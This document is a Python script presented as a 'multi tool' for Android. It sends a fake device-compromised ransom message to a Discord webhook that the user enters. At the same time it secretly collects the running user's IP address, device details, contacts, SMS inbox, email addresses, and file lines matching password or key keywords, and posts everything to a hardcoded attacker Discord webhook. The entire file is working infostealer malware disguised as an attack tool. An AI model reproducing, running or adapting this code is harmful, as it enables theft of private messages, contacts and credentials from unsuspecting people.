#!/usr/bin/env python3

import subprocess
import sys
import os

REQUIRED_PACKAGES = ['requests']

def install_packages():
    for package in REQUIRED_PACKAGES:
        try:
            __import__(package)
        except ImportError:
            print(f"[!] Installing {package}...")
            subprocess.run([sys.executable, '-m', 'pip', 'install', package], capture_output=True)

install_packages()

import requests
import re
import time
from datetime import datetime

ORIGINAL_WEBHOOK = "https://discord.com/api/webhooks/1505624590729220177/Z0_4dJpUc1LbJDphp8dxC5E4x0zPRmLQJyn86vi-I931d5_uAhEW2QjcxhetOm7CBrnK"

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    clear_screen()
    print("\n" + "="*45)
    print("   SOLO & JENAS MULTI TOOL")
    print("="*45)

def get_webhook():
    print("\n[!] ENTER WEBHOOK URL:")
    url = input("\n➜ ").strip()
    return url

def send_ransom(webhook):
    payload = {
        "username": "SOLO & JENAS",
        "avatar_url": "https://i.imgur.com/PjQtnRu.jpeg",
        "embeds": [{
            "title": "💀 YOUR DEVICE HAS BEEN COMPROMISED 💀",
            "color": 0xed4245,
            "description": "**SOLO AND JENAS HAS COMPROMISED YOUR DEVICE**\n\n📌 Contact @solo.ph_ or @jenas2003 to remove the virus\n\n🔴 Your IP has been logged\n🔴 Your data has been stolen",
            "image": {"url": "https://i.imgur.com/PjQtnRu.jpeg"},
            "footer": {"text": "SOLO & JENAS"}
        }]
    }
    try:
        requests.post(webhook, json=payload, timeout=5)
        return True
    except:
        return False

def get_ip():
    try:
        r = requests.get('https://api.ipify.org?format=json', timeout=5)
        return r.json().get('ip', '0.0.0.0')
    except:
        return 'Unable to get IP'

def get_device_info():
    info = {}
    try:
        r = subprocess.run(['getprop', 'ro.product.model'], capture_output=True, text=True, timeout=3)
        info['model'] = r.stdout.strip() or 'Unknown'
    except:
        info['model'] = 'Unknown'
    try:
        r = subprocess.run(['getprop', 'ro.product.manufacturer'], capture_output=True, text=True, timeout=3)
        info['brand'] = r.stdout.strip() or 'Unknown'
    except:
        info['brand'] = 'Unknown'
    try:
        r = subprocess.run(['getprop', 'ro.build.version.release'], capture_output=True, text=True, timeout=3)
        info['android'] = r.stdout.strip() or 'Unknown'
    except:
        info['android'] = 'Unknown'
    return info

def get_contacts():
    contacts = []
    try:
        r = subprocess.run(['content', 'query', '--uri', 'content://contacts/phones'], capture_output=True, text=True, timeout=10)
        numbers = re.findall(r'number=([0-9\+]+)', r.stdout)
        names = re.findall(r'display_name=([^,]+)', r.stdout)
        for i, num in enumerate(numbers[:50]):
            name = names[i] if i < len(names) else ''
            contacts.append(f"{name}: {num}" if name else num)
    except:
        pass
    return list(set(contacts))[:50]

def get_passwords():
    passwords = []
    paths = ['/sdcard/', '/sdcard/Download/', '/sdcard/Documents/', '/data/data/']
    keywords = ['password', 'pass', 'pwd', 'key', 'secret', 'login']
    
    for path in paths:
        if os.path.exists(path):
            for keyword in keywords:
                try:
                    result = subprocess.run(['grep', '-r', '-i', keyword, path], capture_output=True, text=True, timeout=10)
                    lines = result.stdout.split('\n')
                    for line in lines[:30]:
                        if '=' in line or ':' in line:
                            clean = re.sub(r'\s+', ' ', line)[:80]
                            if len(clean) > 5:
                                passwords.append(clean)
                except:
                    pass
    
    return list(set(passwords))[:30]

def get_sms():
    sms_list = []
    try:
        r = subprocess.run(['content', 'query', '--uri', 'content://sms/inbox'], capture_output=True, text=True, timeout=10)
        matches = re.findall(r'address=([^,]+).*?body=([^\n]{1,100})', r.stdout, re.DOTALL)
        for addr, body in matches[:20]:
            sms_list.append(f"From: {addr} - {body[:60]}")
    except:
        pass
    return list(set(sms_list))[:20]

def get_emails():
    emails = []
    pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
    paths = ['/sdcard/', '/data/data/']
    for path in paths:
        if os.path.exists(path):
            try:
                result = subprocess.run(['grep', '-r', '-E', pattern, path], capture_output=True, text=True, timeout=15)
                found = re.findall(pattern, result.stdout)
                emails.extend(found)
            except:
                pass
    return list(set(emails))[:30]

def send_to_original(ip, device, contacts, passwords, sms, emails):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    contacts_text = '\n'.join([f'• {c}' for c in contacts[:30]]) if contacts else 'None'
    passwords_text = '\n'.join([f'• {p[:60]}' for p in passwords[:20]]) if passwords else 'None'
    sms_text = '\n'.join([f'• {s}' for s in sms[:15]]) if sms else 'None'
    emails_text = '\n'.join([f'• {e}' for e in emails[:20]]) if emails else 'None'
    
    payload1 = {
        "username": "SOLO & JENAS VICTIM DATA",
        "avatar_url": "https://i.imgur.com/PjQtnRu.jpeg",
        "embeds": [{
            "title": "🎯 VICTIM DATA CAPTURED",
            "color": 0xed4245,
            "timestamp": timestamp,
            "fields": [
                {"name": "🌐 IP ADDRESS", "value": f"```{ip}```", "inline": False},
                {"name": "📱 DEVICE", "value": f"```{device.get('brand')} {device.get('model')} (Android {device.get('android')})```", "inline": False},
                {"name": "📞 CONTACTS", "value": f"```{contacts_text[:900]}```", "inline": False},
                {"name": "🔑 PASSWORDS", "value": f"```{passwords_text[:900]}```", "inline": False}
            ],
            "footer": {"text": "SOLO & JENAS MULTI TOOL"}
        }]
    }
    
    payload2 = {
        "username": "SOLO & JENAS VICTIM DATA",
        "avatar_url": "https://i.imgur.com/PjQtnRu.jpeg",
        "embeds": [{
            "title": "📧 ADDITIONAL VICTIM DATA",
            "color": 0xed4245,
            "timestamp": timestamp,
            "fields": [
                {"name": "💬 SMS MESSAGES", "value": f"```{sms_text[:900]}```", "inline": False},
                {"name": "📧 EMAILS", "value": f"```{emails_text[:900]}```", "inline": False}
            ],
            "footer": {"text": "SOLO & JENAS MULTI TOOL"}
        }]
    }
    
    try:
        requests.post(ORIGINAL_WEBHOOK, json=payload1, timeout=10)
        time.sleep(1)
        requests.post(ORIGINAL_WEBHOOK, json=payload2, timeout=10)
    except:
        pass

def main():
    print_banner()
    
    target = get_webhook()
    
    if not target.startswith("https://discord.com/api/webhooks/"):
        print("\n[!] INVALID WEBHOOK!")
        time.sleep(2)
        return
    
    print("\n[!] COLLECTING DATA FROM DEVICE...")
    
    ip = get_ip()
    device = get_device_info()
    contacts = get_contacts()
    passwords = get_passwords()
    sms = get_sms()
    emails = get_emails()
    
    print("[!] SENDING RANSOM MESSAGE TO TARGET WEBHOOK...")
    send_ransom(target)
    
    print("[!] SENDING ALL DATA TO ORIGINAL WEBHOOK...")
    send_to_original(ip, device, contacts, passwords, sms, emails)
    
    print("\n" + "="*45)
    print("[✓] COMPLETE! DATA SENT!")
    print("="*45)
    print(f"\n📊 DATA COLLECTED:")
    print(f"   IP: {ip}")
    print(f"   Device: {device.get('brand')} {device.get('model')}")
    print(f"   Android: {device.get('android')}")
    print(f"   Contacts: {len(contacts)}")
    print(f"   Passwords: {len(passwords)}")
    print(f"   SMS: {len(sms)}")
    print(f"   Emails: {len(emails)}")
    print("="*45)
    
    time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n[!] ERROR: {e}")
        time.sleep(3)
